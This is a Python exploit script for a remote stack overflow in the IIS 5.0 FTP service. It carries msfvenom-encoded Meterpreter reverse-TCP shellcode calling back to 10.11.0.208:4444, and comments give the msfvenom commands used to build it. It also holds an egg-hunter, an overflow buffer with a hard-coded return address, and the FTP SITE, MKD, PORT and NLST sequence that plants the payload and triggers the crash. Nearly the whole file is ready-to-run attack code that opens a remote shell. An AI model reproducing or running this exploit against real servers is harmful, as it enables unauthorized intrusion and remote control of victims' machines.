#https://www.exploit-db.com/exploits/16740/

import socket
import sys
import time
import random
import string
import threading
from struct import pack
from ftplib import FTP
import SocketServer

#Shellcode 490 bytes including nops
# This is for the stored payload, the real BadChar list for file paths is:
#'BadChars' => "\x00\x09\x0c\x20\x0a\x0d\x0b",

# \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x22\x2a\x2e\x2f\x3a\x3c\x3e\x3f\x5c\x7c

#Shellcode excluding nops 366
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.208 LPORT=4444 >payload
#perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
#cat stackadj payload > shellcode
#cat shellcode | msfvenom -b "\x00\x09\x0c\x20\x0a\x0d\x0b" -e x86/shikata_ga_nai -t python
shellcode = ""
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\xda\xcb\xb8\x64\x94\xd5\xb5\xd9\x74\x24\xf4\x5f\x33"
shellcode += "\xc9\xb1\x55\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2"
shellcode += "\x91\x15\x39\x19\x54\x16\xc2\x9e\x8e\x94\xc2\x5e\x4e"
shellcode += "\xf9\x4b\xbb\x7f\x39\x2f\xcf\x2f\x89\x3b\x9d\xc3\x62"
shellcode += "\x69\x36\x50\x06\xa6\x39\xd1\xad\x90\x74\xe2\x9e\xe1"
shellcode += "\x17\x60\xdd\x35\xf8\x59\x2e\x48\xf9\x9e\x53\xa1\xab"
shellcode += "\x77\x1f\x14\x5c\xfc\x55\xa5\xd7\x4e\x7b\xad\x04\x06"
shellcode += "\x7a\x9c\x9a\x1d\x25\x3e\x1c\xf2\x5d\x77\x06\x17\x5b"
shellcode += "\xc1\xbd\xe3\x17\xd0\x17\x3a\xd7\x7f\x56\xf3\x2a\x81"
shellcode += "\x9e\x33\xd5\xf4\xd6\x40\x68\x0f\x2d\x3b\xb6\x9a\xb6"
shellcode += "\x9b\x3d\x3c\x13\x1a\x91\xdb\xd0\x10\x5e\xaf\xbf\x34"
shellcode += "\x61\x7c\xb4\x40\xea\x83\x1b\xc1\xa8\xa7\xbf\x8a\x6b"
shellcode += "\xc9\xe6\x76\xdd\xf6\xf9\xd9\x82\x52\x71\xf7\xd7\xee"
shellcode += "\xd8\x9f\x14\xc3\xe2\x5f\x33\x54\x90\x6d\x9c\xce\x3e"
shellcode += "\xdd\x55\xc9\xb9\x22\x4c\xad\x56\xdd\x6f\xce\x7f\x19"
shellcode += "\x3b\x9e\x17\x88\x44\x75\xe8\x35\x91\xe0\xed\xa1\x10"
shellcode += "\xfe\xed\xe1\x4d\x02\xee\x10\xd2\x8b\x08\x42\xba\xdb"
shellcode += "\x84\x22\x6a\x9c\x74\xca\x60\x13\xaa\xea\x8a\xf9\xc3"
shellcode += "\x80\x64\x54\xbb\x3c\x1c\xfd\x37\xdd\xe1\x2b\x32\xdd"
shellcode += "\x6a\xde\xc2\x93\x9a\xab\xd0\xc3\xfa\x53\x29\x13\x97"
shellcode += "\x53\x43\x17\x31\x03\xfb\x15\x64\x63\xa4\xe6\x43\xf7"
shellcode += "\xa3\x18\x12\xce\xd8\x2e\x80\x6e\xb7\x4e\x44\x6f\x47"
shellcode += "\x18\x0e\x6f\x2f\xfc\x6a\x3c\x4a\x03\xa7\x50\xc7\x91"
shellcode += "\x48\x01\xbb\x32\x21\xaf\xe2\x74\xee\x50\xc1\x07\xe9"
shellcode += "\xaf\x97\x25\x52\xd8\x67\x69\x62\x18\x02\x69\x32\x70"
shellcode += "\xd9\x46\xbd\xb0\x22\x4d\x96\xd8\xa9\x03\x54\x78\xad"
shellcode += "\x0e\x38\x24\xae\xbc\xe1\x31\x21\x43\x16\x3e\xc3\x78"
shellcode += "\xc0\x07\xb1\xb9\xd0\x33\xca\xf0\x75\x15\x41\xfa\x2a"
shellcode += "\x65\x40\x90\x90\x90\x90\x90\x90\x90"



def usage():
    print 'Usage: python %s Target_IP [Port] ([FTP_username] [FTP_password])' % sys.argv[0]
    print 'Arguments:'
    print 'Target_IP    Required                        IP of target FTP server'
    print 'Port         Optional (default: 21)          Port target FTP server is hosted on'
    print 'FTP_username Optional (default: anonymous)   User to be passed to target FTP server'
    print 'FTP_password Optional (default: anonymous)   Password to be passed to target FTP server'
    print '**NOTE: ftp_user AND ftp_pass must both be given or defaults will be applied**'

#lazy parsing... sue me :P
def parse_args():
    global ip
    global port
    global ftp_user
    global ftp_pass
    #parse args
    if (len(sys.argv) < 2) or (len(sys.argv) >5):
        usage()
        sys.exit(0)
    
    if sys.argv == 2:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        ftp_user = "anonymous"
        ftp_pass = "anonymous"
    elif sys.argv == 5:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        ftp_user = sys.argv[3]
        ftp_pass = sys.argv[4]
    else:
        ip = sys.argv[1]
        port = 21
        ftp_user = "anonymous"
        ftp_pass = "anonymous"


#code stolen from Alexander Korznikov.
#Source http://www.korznikov.com/2015/04/convert-any-string-into-hex-x41x41.html
def string2hex(string):
    b = string
    return '%s' % (''.join(['\\x%02X' % ord( x ) for x in b]))

def random_hex_string(size=4, chars=string.ascii_uppercase):
    ascii_string = ''.join(random.choice(chars) for _ in range(size))
    #hex_string = string2hex(ascii_string)
    #return hex_string
    return ascii_string

def drop_shellcode(ftp_server, shellcode, egg):
    encoded_shellcode = shellcode.replace("\xff", "\xff\xff")
    i = 0
    while i < 5:
        #data = sock.send("SITE " + egg + encoded_shellcode)
        #data = sock.recv(1024)
        #print data
        try:
            ftp_server.sendcmd("SITE " + egg + encoded_shellcode)
        except:
            pass
        print "[+] Completed pass 1..."
        i = i+1

def build_directory_buffer(egg,patch,ret):
        
    hunt = "\xB8\x55\x55\x52\x55\x35\x55\x55\x55\x55\x40\x81\x38" +egg + "\x75\xF7\x40\x40\x40\x40\xFF\xE0"
    global pre
    pre = random_hex_string(3)
    pst = list(random_hex_string(210))
    pst[0:4] = list(patch)
    pst[90:94] = list(patch)
    pst[94:98] = list(patch)
    pst[140:172] = (list(patch))*8
    pst[158:162] = list(ret)
    pst[182:187] = list("\xe9") + list(pack('<i', -410))
    pst = ''.join(pst)
    pst = pst.replace("\xff", "\xff\xff")
    directory_buffer = pre+pst
    return directory_buffer

class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        data = self.request.recv(1024)
        cur_thread = threading.current_thread()
        #response = "{}: {}".format(cur_thread.name, data)
        #self.request.sendall(response)

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass

def create_tcp_server(HOST="0.0.0.0", PORT=0):
    server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
    # Start a thread with the server -- that thread will then start one
    # more thread for each request
    server_thread = threading.Thread(target=server.serve_forever)
    # Exit the server thread when the main thread terminates
    server_thread.daemon = True
    server_thread.start()
    return server

def main():
    print "IIS 5.0 FTP Remote Stack Overflow Exploit by Disc0rdantMel0dy"
    parse_args()
    
    #create socket
    try:
        ftp_server = FTP()
        print "[+] Connecting to FTP Server: %s on port %d" % (ip, port)
        ftp_server.connect(ip,port,timeout=30)        
                 
    except:
        print "[!] Could not connect to FTP Server: %s on port %d" % (ip, port)
        sys.exit(-1)
    
    print "[+] Connected! Waiting for welcome banner..."
    print ftp_server.getwelcome()

    #Attempt logon to FTP server
    print "[+] Attemping FTP Logon with creds: %s / %s" %(ftp_user, ftp_pass)
    try:
        ftp_server.login(user=ftp_user, passwd=ftp_pass)
        print "[+] Successfully logged in with creds: %s / %s" %(ftp_user,ftp_pass)
    except:
        "[!] Invalid FTP Credentials. If using default credentials please try again specifying valid credentials.  Exiting..."
        sys.exit(-1)
    
    ret = pack('<i', 0x77e42ed8)
    print "[+] Using return address of %s" % string2hex(ret)
    patch = pack('<i', 0x7ffd7ffd)
    #build egg for hunter to point to shellcode
    egg = random_hex_string(4)
    print "[+] Using %s as location for shellcode" % string2hex(egg)
    #drop shellcode onto stack
    print "[+] Dropping shellcode onto stack."
    drop_shellcode(ftp_server, shellcode, egg)
    print "[+] Building attack buffer for directory name"
    d_buffer = build_directory_buffer(egg, patch, ret)
    
    #send overflow directory buffer
    print "[+] Creating long directory..."
    try:
        data = ftp_server.mkd(d_buffer)
        print data
    except:
        print "[!] Unexpected response from FTP Server."
        print "[!] Most likely cause is that the user does not have write permissions to FTP root directory."
        print "[!] You should retry the exploit with different credentials if they are available."
        print "[!] Exiting..."
        sys.exit(-1)
    #data = sock.recv(1024)
    #print data
    #if str(data).startswith("257"):
    #    print "[+] Directory Successfuly Created!"
    #else:
    #    print "[!] Unexpected response from FTP Server."
    #    print "[!] Most likely cause is that the user does not have write permissions to FTP root directory."
    #    print "[!] You should retry the exploit with different credentials if they are available."
    #    print "[!] Exiting..."
    #    sys.exit(-1)
    #start TCP server for FTP server to connect to
    print "[+] Starting local TCP server..."
    srv = create_tcp_server(HOST="10.11.0.208",PORT=0)
    #get info for PORT address
    srv_port1 = srv.server_address[1] / 256
    srv_port2 = srv.server_address[1] % 256
    #build address for PORT command
    srv_address = "%s,%s,%s" % (str(srv.server_address[0]).replace(".",","), srv_port1, srv_port2)

    #send PORT command
    print "[+] Sending Port Command..."
    data = ftp_server.sendcmd("PORT %s" % srv_address)
    print data
    
    #trigger vulnerability
    print "[+] Sending NLIST command to trigger vulnerability..."
    dir_name = " %s*/../%s*/" % (d_buffer, pre)
    data = ftp_server.nlst(dir_name)
    print data
        
main()
